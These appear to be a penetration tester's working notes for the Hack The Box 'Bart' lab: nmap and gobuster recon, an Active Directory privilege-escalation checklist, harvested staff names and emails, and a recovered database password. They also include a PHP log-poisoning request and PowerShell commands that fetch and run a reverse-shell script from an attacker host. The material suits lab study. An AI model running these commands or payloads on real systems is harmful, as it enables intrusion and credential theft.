## Basic commands

```
# Extract VPN IP - $attack
attack=$(ip a show dev tun1 | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')

# Config TMUX
tmux setenv TARGET $TARGET && export TARGET=$TARGET
tmux setenv attack $attack && export attack=$attack

# Scan open ports
TCPports=$(sudo nmap -Pn -p- -T4 $TARGET -oA nmap/TCPports -v | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $TCPports
UDPports=$(sudo nmap -T5 -Pn -sU $TARGET -oA nmap/UDPports -v | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $UDPports

# Scan services of open ports
sudo nmap -Pn -p$TCPports -sS -sV -sC -PA $TARGET -oA nmap/Tserv
sudo nmap -Pn -p$UDPports -sS -sV -sC -sU $TARGET -oA nmap/Userv
-PA: TCP ACK ping

# Basic directory fuzzyng
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x eXt,eXt,eXt -k -o gobuster.txt
png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe

# Modify hosts file
sudo sed -i "/$TARGET      domain/d" /etc/hosts
echo "$TARGET      domain" | sudo tee -a /etc/hosts
```

[] Mount points
[] SMB
[] DNS
[] ftp
[] http enum
    [] folders 
    [] files -x txt,php,html
[] run as admin
[] cron jobs
[] SQL injection
[] Windows suggestor
[] Upload to target
    [] linpeas
    [] pspy

AD
    [] domain name
    [] find users rpcclient -U "" -N $TARGET
    [] kerberos pre authentication disabled (https://github.com/ropnop/kerbrute/releases/tag/v1.0.3 + getPNusers.py (impatck))
    [] net user /domain
    [] net user username
    [] write privileges writeDACL (Bloodhound/sharphound)
        [] create user + add user to group with writedacl + give dsync privilege + dump passwords
        net user USERNAME PASSWORD /add /domain
        net group "GROUP NAME" /add USERNAME
        pass + cred + Add-ObjectACL -PrincipalIdentity USER -Credential -Rights DCSync

How many ports?

Versions?

Paths of URL?

Known CVE

http://forum.bart.htb/
Port TCP: 80

http://10.129.96.185/monitor/
PHP Server Monitor v3.2.1

monitor/compose.json
/monitor/config.php
Proudly powered by WordPress | Theme: Sydney by aThemes | Adapted and modified by BART.

Samantha Brown
Daniel Simmons
Robert Hilt
Daniella Lamborghini
Harvey Potter
Developer@BART<

daniel
harvey


s.brown@bart.htb
d.simmons@bart.htb
r.hilt@bart.htb

JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0], PoweredBy[WordPress], Script[text/javascript], Title[BART], WordPress[4.8.2]

curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=pat&passwd=12345678"
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey

http://internal-01.bart.htb/#

GET /log/log.php?filename=log.php&username=bobby HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php phpinfo();?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=pe24k9ekis4lf1v3men41v4jic
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.220:8081/Invoke-PowerShellTcp.ps1')

powershell+IEX(New-Object+Net.WebClient).downloadString('http://10.10.14.220:8081/Invoke-PowerShellTcp.ps1')


powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.220:8081/shell.exe')

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.220:8081/winpeas.exe')

Invoke-Webrequest -OutFile winpeas.exe http://10.10.14.220:8081/winpeas.exe

kubectl debug node/aks-main-27985587-vmss000001 -it --image=mcr.microsoft.com/cbl-mariner/busybox:2.0


define('PSM_DB_NAME', 'sysmon');
define('PSM_DB_USER', 'daniel');
define('PSM_DB_PASS', '?St4r1ng1sCr33py?');

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
enumdesktops


[+] 10.129.96.185 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.129.96.185 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.129.96.185 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.96.185 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.129.96.185 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.

